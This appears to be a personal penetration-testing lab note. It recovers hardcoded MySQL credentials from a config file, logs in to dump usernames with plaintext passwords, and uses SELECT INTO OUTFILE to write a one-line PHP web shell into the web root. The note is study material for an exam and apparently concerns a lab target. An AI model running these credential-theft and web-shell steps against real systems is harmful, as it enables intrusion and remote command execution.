Now will try to login and see what data we can get from it 
```
mysql -u <username> -p -h 192.168.100.1
```

```
mysql -u admin -p -h 192.168.100.1
```

```
DBManagerLogin!
```

so this is not working which means we have to do osint in the file to get the pasword that might work

db_connect.php looks fishy
![[Pasted image 20240817172018.png]]


BINGOOOOOOOOOOOOOOO
```
define('DB_SRV', '192.168.100.1');
define('DB_PASSWD', "!123SecureAdminDashboard321!");
define('DB_USER', 'admin');
define('DB_NAME', 'DashboardDB');
```


```
mysql -u admin -p -h 192.168.100.1
```

```
!123SecureAdminDashboard321!
```


>[! important] Important

This happened here and might happened in the exam as well. I was not able to get the mysql shell in the dumb shell and after i changed it into interactive shell i was able to get it.

Taking help of Chat GPT

![[Pasted image 20240817224657.png]]

```
select username,password from users limit 10;
```

```
| username | password        |
+----------+-----------------+
| admin    | DBManagerLogin! |
| gurag    | AAAA      
```


```
select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
```
![[Pasted image 20240817230257.png]]

```

```